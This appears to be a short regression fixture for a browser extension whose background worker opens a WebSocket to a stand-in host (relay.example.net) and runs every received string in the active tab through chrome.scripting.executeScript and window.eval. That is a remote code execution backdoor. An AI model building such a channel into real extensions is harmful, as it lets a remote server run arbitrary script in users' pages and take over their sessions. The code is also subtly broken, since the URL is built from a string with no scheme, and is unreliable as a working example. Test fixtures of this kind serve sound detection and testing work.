// Regression fixture: an extension background worker opens a WebSocket to a
// remote host, forces the wss scheme, and runs each received string in the
// active tab through the scripting API.
const endpoint = new URL("relay.example.net/socket");
endpoint.protocol = "wss:";
const socket = new WebSocket(endpoint.href);

socket.onmessage = async (event) => {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  await chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: (code) => { window.eval(code); },
    args: [event.data],
  });
};
